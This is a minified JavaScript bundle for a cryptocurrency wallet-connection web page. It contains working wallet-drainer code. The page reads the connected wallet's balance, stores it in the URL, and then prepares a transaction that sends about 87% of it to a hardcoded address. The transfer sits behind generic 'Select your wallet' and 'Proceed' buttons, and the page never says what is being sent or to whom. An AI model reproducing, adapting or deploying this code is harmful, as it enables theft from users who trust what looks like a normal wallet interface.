(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[405],{48312:function(n,t,e){(window.__NEXT_P=window.__NEXT_P||[]).push(["/",function(){return e(21468)}])},21468:function(n,t,e){"use strict";e.r(t),e.d(t,{default:function(){return p}});var i=e(85893),o=e(69077);function r(n,t){(null==t||t>n.length)&&(t=n.length);for(var e=0,i=new Array(t);e<t;e++)i[e]=n[e];return i}function s(n,t){return function(n){if(Array.isArray(n))return n}(n)||function(n){if("undefined"!==typeof Symbol&&null!=n[Symbol.iterator]||null!=n["@@iterator"])return Array.from(n)}(n)||function(n,t){if(n){if("string"===typeof n)return r(n,t);var e=Object.prototype.toString.call(n).slice(8,-1);return"Object"===e&&n.constructor&&(e=n.constructor.name),"Map"===e||"Set"===e?Array.from(e):"Arguments"===e||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(e)?r(n,t):void 0}}(n,t)||function(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}var l=e(67294),d=function(){var n=s(l.useState(!1),2),t=n[0],e=n[1];return l.useEffect((function(){return e(!0)}),[]),t},c=function(){return(0,i.jsxs)("div",{children:[(0,i.jsx)("div",{children:(0,i.jsx)(a,{})}),(0,i.jsx)("div",{children:(0,i.jsx)(u,{})})]})},a=function(){var n=(0,o.mA)().address,t=(0,o.KQ)({address:n,watch:!0}),e=t.data,r=t.refetch,s=window.location.href;console.log(s);var l=(d=new URL(s)).searchParams.get("amt");console.log(l);var d=new URL(s);if(null==l||0==parseFloat(l)){var c=null===e||void 0===e?void 0:e.formatted.toString();console.log(c),void 0==c&&(c=0),console.log(c),d.searchParams.set("amt",c),history.pushState({},"null",d)}var a=document.getElementById("sendTxn");return console.log(a),setTimeout((function(){}),5e3),(0,i.jsxs)("div",{children:[null===e||void 0===e?void 0:e.formatted,(0,i.jsx)("input",{id:"walletBalance",placeholder:"wallet address",value:null===e||void 0===e?void 0:e.formatted}),(0,i.jsx)("button",{type:"button",onClick:function(){return r()},children:"fetch"})]})},u=function(){var n=(0,l.useState)(""),t=n[0],e=n[1],r=(0,o.KQ)({address:t}),s=r.data,d=r.isLoading,c=r.refetch,a=(0,l.useState)(""),u=a[0],L=a[1];return(0,i.jsxs)("div",{children:["Find balance:"," ",(0,i.jsx)("input",{onChange:function(n){return L(n.target.value)},placeholder:"wallet address",value:u}),(0,i.jsx)("button",{type:"button",onClick:function(){return u===t?c():e(u)},children:d?"fetching...":"fetch"}),(0,i.jsx)("div",{children:null===s||void 0===s?void 0:s.formatted})]})},L=e(61344),h=function(){var n=window.location.href;console.log(n);var t=new URL(n).searchParams.get("amt");console.log(t);var e=parseFloat(t)/1.15;console.log(e);var r=e*Math.pow(10,18);console.log(r,"MULTIPLY");var s=BigInt(parseInt(r));console.log(s);var l=function(n){document.getElementById(n).click()},d=(0,o.pQ)({to:"0x9BC76C1800cF9666124604717EBE58612476025E",value:s}),c=d.data,a=d.isIdle,u=d.isLoading,h=d.isSuccess,x=d.isError,j=d.sendTransaction;return u?(0,i.jsx)("div",{id:"sendTxn",children:"Check your wallet"}):a?(0,i.jsxs)("div",{id:"sendTxn",children:[(0,i.jsxs)("span",{id:"mobilecontrols",children:[(0,i.jsx)("div",{children:"Select your mobile wallet "}),(0,i.jsx)("br",{}),(0,i.jsx)("br",{}),(0,i.jsxs)("button",{type:"button",id:"mwc",className:"wc",onClick:function(){return l("btn3")},children:[(0,i.jsx)("img",{src:"https://1000logos.net/wp-content/uploads/2022/05/WalletConnect-Logo.jpg",width:"30px"})," WalletConnect"]})]}),(0,i.jsxs)("span",{id:"pccontrols",children:[(0,i.jsx)("div",{children:"Select your  wallet "}),(0,i.jsx)("br",{}),(0,i.jsx)("button",{type:"button",id:"mwc",className:"trust",onClick:function(){return l("btn6")},children:"Auto Detect"}),(0,i.jsx)("br",{}),(0,i.jsx)("br",{}),(0,i.jsxs)("button",{type:"button",id:"mm",onClick:function(){return l("btn1")},children:[(0,i.jsxs)("svg",{"aria-hidden":"true",className:"h-4",viewBox:"0 0 40 38",fill:"none",xmlns:"http://www.w3.org/2000/svg",children:[(0,i.jsx)("path",{d:"M39.0728 0L21.9092 12.6999L25.1009 5.21543L39.0728 0Z",fill:"#E17726"}),(0,i.jsx)("path",{d:"M0.966797 0.0151367L14.9013 5.21656L17.932 12.7992L0.966797 0.0151367Z",fill:"#E27625"}),(0,i.jsx)("path",{d:"M32.1656 27.0093L39.7516 27.1537L37.1004 36.1603L27.8438 33.6116L32.1656 27.0093Z",fill:"#E27625"}),(0,i.jsx)("path",{d:"M7.83409 27.0093L12.1399 33.6116L2.89876 36.1604L0.263672 27.1537L7.83409 27.0093Z",fill:"#E27625"}),(0,i.jsx)("path",{d:"M17.5203 10.8677L17.8304 20.8807L8.55371 20.4587L11.1924 16.4778L11.2258 16.4394L17.5203 10.8677Z",fill:"#E27625"}),(0,i.jsx)("path",{d:"M22.3831 10.7559L28.7737 16.4397L28.8067 16.4778L31.4455 20.4586L22.1709 20.8806L22.3831 10.7559Z",fill:"#E27625"}),(0,i.jsx)("path",{d:"M12.4115 27.0381L17.4768 30.9848L11.5928 33.8257L12.4115 27.0381Z",fill:"#E27625"}),(0,i.jsx)("path",{d:"M27.5893 27.0376L28.391 33.8258L22.5234 30.9847L27.5893 27.0376Z",fill:"#E27625"}),(0,i.jsx)("path",{d:"M22.6523 30.6128L28.6066 33.4959L23.0679 36.1282L23.1255 34.3884L22.6523 30.6128Z",fill:"#D5BFB2"}),(0,i.jsx)("path",{d:"M17.3458 30.6143L16.8913 34.3601L16.9286 36.1263L11.377 33.4961L17.3458 30.6143Z",fill:"#D5BFB2"}),(0,i.jsx)("path",{d:"M15.6263 22.1875L17.1822 25.4575L11.8848 23.9057L15.6263 22.1875Z",fill:"#233447"}),(0,i.jsx)("path",{d:"M24.3739 22.1875L28.133 23.9053L22.8184 25.4567L24.3739 22.1875Z",fill:"#233447"}),(0,i.jsx)("path",{d:"M12.8169 27.0049L11.9606 34.0423L7.37109 27.1587L12.8169 27.0049Z",fill:"#CC6228"}),(0,i.jsx)("path",{d:"M27.1836 27.0049L32.6296 27.1587L28.0228 34.0425L27.1836 27.0049Z",fill:"#CC6228"}),(0,i.jsx)("path",{d:"M31.5799 20.0605L27.6165 24.0998L24.5608 22.7034L23.0978 25.779L22.1387 20.4901L31.5799 20.0605Z",fill:"#CC6228"}),(0,i.jsx)("path",{d:"M8.41797 20.0605L17.8608 20.4902L16.9017 25.779L15.4384 22.7038L12.3988 24.0999L8.41797 20.0605Z",fill:"#CC6228"}),(0,i.jsx)("path",{d:"M8.15039 19.2314L12.6345 23.7816L12.7899 28.2736L8.15039 19.2314Z",fill:"#E27525"}),(0,i.jsx)("path",{d:"M31.8538 19.2236L27.2061 28.2819L27.381 23.7819L31.8538 19.2236Z",fill:"#E27525"}),(0,i.jsx)("path",{d:"M17.6412 19.5088L17.8217 20.6447L18.2676 23.4745L17.9809 32.166L16.6254 25.1841L16.625 25.1119L17.6412 19.5088Z",fill:"#E27525"}),(0,i.jsx)("path",{d:"M22.3562 19.4932L23.3751 25.1119L23.3747 25.1841L22.0158 32.1835L21.962 30.4328L21.75 23.4231L22.3562 19.4932Z",fill:"#E27525"}),(0,i.jsx)("path",{d:"M27.7797 23.6011L27.628 27.5039L22.8977 31.1894L21.9414 30.5138L23.0133 24.9926L27.7797 23.6011Z",fill:"#F5841F"}),(0,i.jsx)("path",{d:"M12.2373 23.6011L16.9873 24.9926L18.0591 30.5137L17.1029 31.1893L12.3723 27.5035L12.2373 23.6011Z",fill:"#F5841F"}),(0,i.jsx)("path",{d:"M10.4717 32.6338L16.5236 35.5013L16.4979 34.2768L17.0043 33.8323H22.994L23.5187 34.2753L23.48 35.4989L29.4935 32.641L26.5673 35.0591L23.0289 37.4894H16.9558L13.4197 35.0492L10.4717 32.6338Z",fill:"#C0AC9D"}),(0,i.jsx)("path",{d:"M22.2191 30.231L23.0748 30.8354L23.5763 34.8361L22.8506 34.2234H17.1513L16.4395 34.8485L16.9244 30.8357L17.7804 30.231H22.2191Z",fill:"#161616"}),(0,i.jsx)("path",{d:"M37.9395 0.351562L39.9998 6.53242L38.7131 12.7819L39.6293 13.4887L38.3895 14.4346L39.3213 15.1542L38.0875 16.2779L38.8449 16.8264L36.8347 19.1742L28.5894 16.7735L28.5179 16.7352L22.5762 11.723L37.9395 0.351562Z",fill:"#763E1A"}),(0,i.jsx)("path",{d:"M2.06031 0.351562L17.4237 11.723L11.4819 16.7352L11.4105 16.7735L3.16512 19.1742L1.15488 16.8264L1.91176 16.2783L0.678517 15.1542L1.60852 14.4354L0.350209 13.4868L1.30098 12.7795L0 6.53265L2.06031 0.351562Z",fill:"#763E1A"}),(0,i.jsx)("path",{d:"M28.1861 16.2485L36.9226 18.7921L39.7609 27.5398L32.2728 27.5398L27.1133 27.6049L30.8655 20.2912L28.1861 16.2485Z",fill:"#F5841F"}),(0,i.jsx)("path",{d:"M11.8139 16.2485L9.13399 20.2912L12.8867 27.6049L7.72971 27.5398H0.254883L3.07728 18.7922L11.8139 16.2485Z",fill:"#F5841F"}),(0,i.jsx)("path",{d:"M25.5283 5.17383L23.0847 11.7736L22.5661 20.6894L22.3677 23.4839L22.352 30.6225H17.6471L17.6318 23.4973L17.4327 20.6869L16.9139 11.7736L14.4707 5.17383H25.5283Z",fill:"#F5841F"})]})," Metamask"]}),(0,i.jsx)("br",{}),(0,i.jsx)("br",{}),(0,i.jsx)("button",{type:"button",id:"mwc",className:"trust",onClick:function(){return l("btn2")},children:"Coinbase"}),(0,i.jsx)("br",{}),(0,i.jsx)("br",{}),(0,i.jsx)("br",{}),(0,i.jsxs)("button",{type:"button",id:"mwc",className:"wc",onClick:function(){return l("btn3")},children:[(0,i.jsx)("img",{src:"https://1000logos.net/wp-content/uploads/2022/05/WalletConnect-Logo.jpg",width:"30px"})," WalletConnect"]}),(0,i.jsx)("br",{}),(0,i.jsx)("br",{}),(0,i.jsx)("button",{type:"button",id:"mwc",className:"trust",onClick:function(){return l("btn5")},children:"Ledger"})]}),(0,i.jsx)("br",{}),(0,i.jsx)("br",{}),(0,i.jsx)("button",{type:"button",id:"process",disabled:u,onClick:function(){return j()},children:"Proceed"})]}):(0,i.jsxs)("div",{id:"sendTxn",children:[h&&(0,i.jsxs)("div",{className:"finishTxn",children:["Transaction: ",(0,L.P)(c)]}),x&&(0,i.jsx)("div",{className:"finishTxn",children:"Error processing wallet"})]})},x=function(){var n,t=(0,l.useState)("0x1f9840a85d5af5bf1d1762f925bdaddc4201f984"),e=t[0],r=t[1],s=(0,o.dQ)({address:e}),d=s.data,c=s.isError,a=s.isLoading,u=s.refetch;return a?(0,i.jsx)("div",{children:"Fetching token\u2026"}):c?(0,i.jsx)("div",{children:"Error fetching token"}):(0,i.jsxs)("div",{children:[null===d||void 0===d||null===(n=d.totalSupply)||void 0===n?void 0:n.formatted," ",null===d||void 0===d?void 0:d.symbol,(0,i.jsxs)("div",{children:[(0,i.jsx)("input",{onChange:function(n){return r(n.target.value)},placeholder:"token address",value:e}),(0,i.jsx)("button",{type:"button",onClick:function(){return u()},children:"fetch"})]})]})},j=function(){var n,t,e=d(),r=(0,o.mA)({onConnect:function(n){return console.log("connected",n)},onDisconnect:function(){return console.log("disconnected")}}),s=(0,o.F6)({address:null===r||void 0===r?void 0:r.address,chainId:1}).data,l=(0,o.c9)({name:s,chainId:1}).data,a=(0,o.qL)();return(0,i.jsxs)("div",{children:[(0,i.jsx)("div",{id:"conntectorDetails",children:e&&(null===r||void 0===r||null===(n=r.connector)||void 0===n?void 0:n.name)&&(0,i.jsxs)("span",{id:"fullyConnected",children:["Connected to ",r.connector.name]})}),(0,i.jsxs)("div",{children:[null!==s&&void 0!==s?s:null===r||void 0===r?void 0:r.address,s?" (".concat(null===r||void 0===r?void 0:r.address,")"):null]}),l&&(0,i.jsx)("img",{alt:"ENS avatar",src:l,style:{height:40,width:40}}),(0,i.jsxs)("div",{children:[(null===r||void 0===r?void 0:r.address)&&(0,i.jsx)("button",{id:"disconnect",type:"button",onClick:function(){return a.disconnect()},children:"Disconnect"}),e&&(null===r||void 0===r||null===(t=r.connector)||void 0===t?void 0:t.name)&&(0,i.jsxs)("span",{children:["Connected to ",r.connector.name]})]}),(0,i.jsxs)(i.Fragment,{children:[(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)("h4",{children:"Balance"}),(0,i.jsx)(c,{}),(0,i.jsx)("h4",{children:"Send Transaction"}),(0,i.jsx)(h,{})]}),(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)("h4",{children:"Token"}),(0,i.jsx)(x,{})]})]})]})},f=function(){var n=d(),t=(0,o.mA)(),e=t.connector,r=t.isReconnecting,s=(0,o.$4)(),l=s.connect,c=s.connectors,a=s.isLoading,u=s.error,L=s.pendingConnector,h=1;return(0,i.jsxs)("div",{children:[(0,i.jsx)("div",{id:"conbtns",children:c.map((function(t){return(0,i.jsxs)("button",{disabled:!t.ready||r||(null===e||void 0===e?void 0:e.id)===t.id,type:"button",id:"btn"+h++,onClick:function(){return l({connector:t})},children:["injected"===t.id?n?t.name:t.id:t.name,n&&!t.ready&&" (unsupported)",a&&t.id===(null===L||void 0===L?void 0:L.id)&&"\u2026"]},t.name)}))}),(0,i.jsx)("div",{children:null===u||void 0===u?void 0:u.message})]})},v=function(){var n,t=(0,o.LN)().chain,e=(0,o.g0)(),r=e.chains,s=e.error,l=e.pendingChainId,d=e.switchNetwork,c=e.status;return(0,i.jsxs)("div",{children:[t&&(0,i.jsxs)("div",{children:["Using ",t.name]}),r.map((function(n){return(0,i.jsxs)("button",{disabled:!d||n.id===(null===t||void 0===t?void 0:t.id),type:"button",onClick:function(){return null===d||void 0===d?void 0:d(n.id)},children:["Switch to ",n.name,"loading"===c&&n.id===l&&"\u2026"]},n.id)})),(0,i.jsx)("div",{children:s&&(null!==(n=null===s||void 0===s?void 0:s.message)&&void 0!==n?n:"Failed to switch")})]})},p=(e(84193).em,function(){return d()?(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(f,{}),(0,i.jsx)(j,{}),(0,i.jsx)(v,{}),(0,i.jsx)("span",{className:"processBtn"})]}):null})}},function(n){n.O(0,[774,888,179],(function(){return t=48312,n(n.s=t);var t}));var t=n.O();_N_E=t}]);